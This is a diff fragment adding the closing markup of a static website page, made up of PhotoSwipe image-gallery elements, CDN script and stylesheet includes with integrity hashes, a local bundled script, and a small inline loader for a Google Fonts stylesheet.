+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.799eb5847effe83ae252baf7b2236f0c3752b0188dd0985faa7efc75ea805b29.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
